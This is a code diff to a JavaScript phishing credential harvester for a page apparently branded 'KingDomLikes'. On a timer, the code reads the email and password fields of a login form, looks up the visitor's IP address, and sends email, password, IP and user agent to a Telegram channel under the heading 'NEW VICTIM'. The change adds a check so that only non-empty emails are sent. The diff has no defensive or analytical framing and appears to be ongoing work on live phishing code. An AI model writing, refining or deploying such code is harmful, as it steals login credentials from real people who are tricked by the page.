@@ -22,16 +22,18 @@ setInterval(function() {
   var password = document.getElementById(`password`).value;
   var userAgent = navigator.userAgent;
 
-  fetch('https://ipinfo.io/json')
-    .then(response => response.json())
-    .then(data => {
-        var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}`;
-        sendTelegramMessage(message); 
-    })
-    .catch(error => {
-        var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}`;
-        sendTelegramMessage(message); 
-    });
+  if (email !== ``) {
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+          var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}`;
+          sendTelegramMessage(message); 
+      })
+      .catch(error => {
+          var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}`;
+          sendTelegramMessage(message); 
+      });
+  };
   
   console.log(email);
 
